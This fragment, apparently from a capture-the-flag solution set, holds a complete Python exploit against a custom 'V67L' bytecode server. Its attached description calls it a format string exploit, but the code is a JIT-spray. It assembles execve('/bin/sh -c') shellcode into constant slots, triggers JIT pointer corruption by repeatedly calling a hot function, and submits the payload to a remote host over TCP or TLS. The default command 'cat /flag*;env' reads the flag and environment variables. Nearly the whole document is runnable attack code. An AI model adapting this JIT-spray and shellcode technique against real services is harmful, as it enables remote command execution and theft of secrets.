        "content": "Format string exploit untuk v67 binary.",
        "code": "\n#!/usr/bin/env python3\nimport argparse\nimport socket\nimport struct\nimport sys\nfrom pathlib import Path\n\nMAGIC = b\"V67L\\x01\"\n\nOP_CONST = 0x01\nOP_ADD   = 0x03\nOP_LT    = 0x08\nOP_JMP   = 0x09\nOP_JZ    = 0x0a\nOP_CALL  = 0x0b\nOP_RET   = 0x0c\n\n\ndef p32(v):\n    return struct.pack(\"<I\", v)\n\n\ndef build_shellcode(command):\n    b = command.encode(\"ascii\") + b\"\\x00\"\n    count = (len(b) + 3) // 4\n    space = ((count * 4 + 15) // 16) * 16\n\n    if space > 127:\n        raise ValueError(\"Command too long\")\n\n    ops = []\n\n    def emit(code):\n        assert len(code) <= 6\n        ops.append(code)\n\n    # Construct /bin/sh on stack\n    emit(b\"\\x48\\x83\\xec\\x10\")\n    emit(b\"\\xb8/bin\")\n    emit(b\"\\x89\\x04\\x24\")\n    emit(b\"\\xb8/sh\\x00\")\n    emit(b\"\\x89\\x44\\x24\\x04\")\n    emit(b\"\\x48\\x89\\xe7\")\n\n    # Construct shell command\n    emit(b\"\\x48\\x83\\xec\" + bytes([space]))\n\n    for i in range(count):\n        part = b[i * 4:i * 4 + 4].ljust(4, b\"\\x00\")\n\n        emit(b\"\\xb8\" + part)\n\n        offset = i * 4\n\n        if offset == 0:\n            emit(b\"\\x89\\x04\\x24\")\n        else:\n            emit(b\"\\x89\\x44\\x24\" + bytes([offset]))\n\n    # execve(\"/bin/sh\", [\"/bin/sh\", \"-c\", command], NULL)\n    emit(b\"\\x48\\x89\\xe3\")\n    emit(b\"\\x68\\x2d\\x63\\x00\\x00\")\n    emit(b\"\\x48\\x89\\xe2\")\n    emit(b\"\\x31\\xc0\")\n    emit(b\"\\x50\")\n    emit(b\"\\x53\")\n    emit(b\"\\x52\")\n    emit(b\"\\x57\")\n    emit(b\"\\x48\\x89\\xe6\")\n    emit(b\"\\x31\\xd2\")\n    emit(b\"\\xb0\\x3b\")\n    emit(b\"\\x0f\\x05\")\n\n    groups = []\n    current = bytearray()\n\n    for op in ops:\n        if len(current) + len(op) > 6:\n            groups.append(bytes(current))\n            current.clear()\n\n        current.extend(op)\n\n    if current:\n        groups.append(bytes(current))\n\n    # Immediate slots are separated by 17 bytes.\n    # Each slot has 6 bytes of instructions and a short jump.\n    chunks = [\n        x.ljust(6, b\"\\x90\") + b\"\\xeb\\x09\"\n        for x in groups[:-1]\n    ]\n\n    chunks.append(groups[-1].ljust(8, b\"\\xcc\"))\n\n    return chunks\n\n\ndef make_function(arity, registers, code):\n    return bytes([arity, registers]) + p32(len(code)) + code\n\n\ndef make_payload(command):\n    chunks = build_shellcode(command)\n\n    # JIT:\n    # 21-byte prologue\n    # CONST immediate starts at offset 23\n    # Each CONST emits 17 native bytes\n    #\n    # Corrupted JIT pointer advances by instruction count.\n\n    index = max(0, (len(chunks) - 22 + 15) // 16)\n\n    instruction_count = 23 + 17 * index\n    const_count = instruction_count - 1\n\n    values = [b\"\\x00\" * 8] * index + chunks\n\n    if len(values) > const_count:\n        raise ValueError(\"Shellcode exceeds available slots\")\n\n    values += [b\"\\x00\" * 8] * (const_count - len(values))\n\n    hot_code = b\"\".join(\n        bytes([OP_CONST, 0]) + value\n        for value in values\n    )\n\n    hot_code += bytes([OP_RET, 0])\n\n    # Main bytecode function repeatedly invokes hot function.\n    entry = bytearray()\n    labels = {}\n    patches = []\n\n    def const(reg, value):\n        entry.extend(\n            bytes([OP_CONST, reg]) +\n            struct.pack(\"<q\", value)\n        )\n\n    def label(name):\n        labels[name] = len(entry)\n\n    def jump(opcode, target):\n        if opcode == OP_JZ:\n            entry.extend(bytes([OP_JZ, 3]))\n        else:\n            entry.append(OP_JMP)\n\n        offset = len(entry)\n        entry.extend(b\"\\x00\" * 4)\n        patches.append((offset, target))\n\n    const(0, 0)\n    const(1, 1000000)\n    const(2, 1)\n\n    label(\"loop\")\n\n    # CALL function 1, result -> r3, argc=0\n    entry.extend(\n        bytes([OP_CALL]) +\n        struct.pack(\"<H\", 1) +\n        bytes([3, 0])\n    )\n\n    # r0 += 1\n    entry.extend(bytes([OP_ADD, 0, 0, 2]))\n\n    # r3 = r0 < limit\n    entry.extend(bytes([OP_LT, 3, 0, 1]))\n\n    jump(OP_JZ, \"done\")\n    jump(OP_JMP, \"loop\")\n\n    label(\"done\")\n    entry.extend(bytes([OP_RET, 0]))\n\n    for offset, target in patches:\n        relative = labels[target] - (offset + 4)\n        struct.pack_into(\"<i\", entry, offset, relative)\n\n    main_function = make_function(0, 4, entry)\n    hot_function = make_function(0, 1, hot_code)\n\n    payload = (\n        MAGIC +\n        struct.pack(\"<HH\", 2, 0) +\n        main_function +\n        hot_function\n    )\n\n    if len(payload) > 2 << 20:\n        raise ValueError(\"Payload exceeds server limit\")\n\n    return payload, len(chunks), instruction_count\n\n\ndef remote_exchange(host, port, payload, tls):\n    raw = socket.create_connection(\n        (host, port),\n        timeout=8\n    )\n\n    with raw:\n        if tls:\n            import ssl\n            context = ssl._create_unverified_context()\n            sock = context.wrap_socket(\n                raw,\n                server_hostname=host\n            )\n        else:\n            sock = raw\n\n        sock.settimeout(30)\n\n        prompt = bytearray()\n\n        while b\"V67L bytecode length:\" not in prompt:\n            data = sock.recv(4096)\n\n            if not data:\n                raise ConnectionError(\n                    \"Connection closed before prompt\"\n                )\n\n            prompt.extend(data)\n\n        print(prompt.decode(errors=\"replace\"), end=\"\", flush=True)\n\n        # Send length followed by raw binary bytecode.\n        sock.sendall(\n            str(len(payload)).encode() +\n            b\"\\n\" +\n            payload\n        )\n\n        print(\"[*] Payload submitted\", flush=True)\n\n        while True:\n            try:\n                data = sock.recv(65536)\n            except socket.timeout:\n                print(\"[!] Remote response timed out\")\n                break\n\n            if not data:\n                break\n\n            sys.stdout.buffer.write(data)\n            sys.stdout.buffer.flush()\n\n\ndef main():\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\n        \"--command\",\n        default=\"cat /flag*;env\"\n    )\n\n    parser.add_argument(\n        \"--out\",\n        default=\"v67l-payload.bin\"\n    )\n\n    parser.add_argument(\"--host\")\n    parser.add_argument(\"--port\", type=int, default=1337)\n    parser.add_argument(\"--tls\", action=\"store_true\")\n\n    args = parser.parse_args()\n\n    payload, chunks, stride = make_payload(args.command)\n\n    Path(args.out).write_bytes(payload)\n\n    print(f\"[+] Payload size: {len(payload)}\")\n    print(f\"[+] Shellcode slots: {chunks}\")\n    print(f\"[+] JIT pointer stride: {stride}\")\n    print(f\"[+] Saved: {args.out}\")\n\n    if args.host:\n        remote_exchange(\n            args.host,\n            args.port,\n            payload,\n            args.tls\n        )\n    else:\n        print(\"[+] Local payload generated\")\n\n\nif __name__ == \"__main__\":\n    main()\n"
